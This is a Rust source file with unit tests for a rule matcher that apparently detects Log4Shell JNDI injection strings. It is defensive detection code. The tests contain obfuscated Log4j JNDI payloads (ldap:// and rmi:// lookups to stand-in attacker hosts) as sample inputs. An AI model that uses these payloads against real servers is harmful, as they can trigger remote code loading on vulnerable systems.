mod matcher;
use matcher::Matcher;
pub struct Ruleset {
    rules: Vec<Vec<char>>,
}

impl Ruleset {
    pub fn new(rules: &mut std::str::Lines) -> Self {
        Self {
            rules: rules.map(|rule| rule.trim().chars().collect()).collect(),
        }
    }

    pub fn match_rules(&self, line: &str) -> bool {
        let mut matchers: Vec<Matcher> = self.rules.iter().map(|rule| Matcher::new(rule)).collect();

        for c in line.chars() {
            let is_match = matchers.iter_mut().any(|matcher| {
                matcher.advance(c);
                matcher.is_match()
            });

            if is_match {
                return true;
            }
        }

        false
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_ldap() {
        let ruleset = Ruleset::new(&mut "${jndi:ldap://".lines());
        let lines = vec![
            "${jndi:ldap://somesitehackerofhell.com/z}",
            "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//somesitehackerofhell.com/z}",
            "${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://somesitehackerofhell.com/z}",
            "${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://somesitehackerofhell.com/z}",
            "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://somesitehackerofhell.com/z}"
        ];

        assert!(lines.iter().all(|line| ruleset.match_rules(line)));
    }

    #[test]
    fn detects_rmi() {
        let ruleset = Ruleset::new(&mut "${jndi:rmi://".lines());
        let lines = vec![
            "${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}",
            "${jndi:rmi://adsasd.asdasd.asdasd}",
            "${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}",
            "${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}",
            "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}",
            "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}",
        ];

        assert!(lines.iter().all(|line| ruleset.match_rules(line)));
    }

    #[test]
    fn skips_safe_lines() {
        let ruleset = Ruleset::new(&mut "${jndi:rmi://".lines());
        let lines = vec![
            "jndi:ldap",
            "jndi:rmi",
            "${hello}",
            "://log4j_cop.com",
            "something else",
        ];

        assert_eq!(false, lines.iter().any(|line| ruleset.match_rules(line)));
    }
}
